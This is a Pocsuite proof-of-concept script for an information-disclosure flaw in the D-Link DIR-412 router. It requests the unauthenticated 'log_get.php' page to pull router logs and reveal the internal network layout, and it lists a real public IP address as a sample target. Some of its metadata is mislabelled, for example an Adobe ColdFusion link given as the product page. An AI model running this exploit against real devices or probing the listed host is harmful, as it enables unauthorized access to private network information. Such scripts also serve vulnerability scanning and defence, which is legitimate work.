#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr
from urlparse import urlparse, urljoin


class TestPOC(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2018-10-16'
    createDate = '2018-10-16'
    updateDate = '2018-10-16'
    references = ['https://www.anquanke.com/vul/id/1782390']
    name = 'DIR-412 日志泄漏漏洞'
    appPowerLink = 'https://www.adobe.com/products/coldfusion-family.html'
    appName = 'D-Link'
    appVersion = 'https://www.dlink.com/en/consumer'
    vulType = '信息泄漏'
    desc = '''
    D-Link DIR-412是中国台湾友讯（D-Link）公司的一款无线路由器。 D-Link DIR-412 A1-1.14WW版本中存在安全漏洞，该漏洞源于一些Web页面没有要求进行身份验证。攻击者可利用该漏洞获取路由器的日志文件，发现内网网络结构。
    '''
    samples = ['http://94.240.114.81:8080']
    install_requires = []

    def _verify(self):
        result = {}
        url = urljoin(self.url, 'log_get.php')
        log_resp = req.get(url)
        if log_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['LOG'] = url

        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
